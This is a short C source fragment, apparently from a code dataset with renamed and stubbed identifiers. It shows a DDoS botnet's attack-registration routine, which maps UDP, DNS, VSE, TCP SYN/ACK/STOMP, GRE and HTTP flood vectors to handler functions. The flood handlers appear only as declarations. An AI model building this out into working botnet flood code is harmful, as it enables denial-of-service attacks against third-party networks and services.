#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  BOOL ;
typedef  int /*<<< orphan*/  ATTACK_FUNC ;

/* Variables and functions */
 int /*<<< orphan*/  ATK_VEC_ACK ; 
 int /*<<< orphan*/  ATK_VEC_DNS ; 
 int /*<<< orphan*/  ATK_VEC_GREETH ; 
 int /*<<< orphan*/  ATK_VEC_GREIP ; 
 int /*<<< orphan*/  ATK_VEC_HTTP ; 
 int /*<<< orphan*/  ATK_VEC_STOMP ; 
 int /*<<< orphan*/  ATK_VEC_SYN ; 
 int /*<<< orphan*/  ATK_VEC_UDP ; 
 int /*<<< orphan*/  ATK_VEC_UDP_PLAIN ; 
 int /*<<< orphan*/  ATK_VEC_VSE ; 
 int /*<<< orphan*/  TRUE ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ attack_app_http ; 
 scalar_t__ attack_gre_eth ; 
 scalar_t__ attack_gre_ip ; 
 scalar_t__ attack_tcp_ack ; 
 scalar_t__ attack_tcp_stomp ; 
 scalar_t__ attack_tcp_syn ; 
 scalar_t__ attack_udp_dns ; 
 scalar_t__ attack_udp_generic ; 
 scalar_t__ attack_udp_plain ; 
 scalar_t__ attack_udp_vse ; 

BOOL FUNC1(void)
{
    int i;

    FUNC0(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);
    FUNC0(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
    FUNC0(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns);
	FUNC0(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);

    FUNC0(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
    FUNC0(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
    FUNC0(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);

    FUNC0(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
    FUNC0(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);

    //add_attack(ATK_VEC_PROXY, (ATTACK_FUNC)attack_app_proxy);
    FUNC0(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);

    return TRUE;
}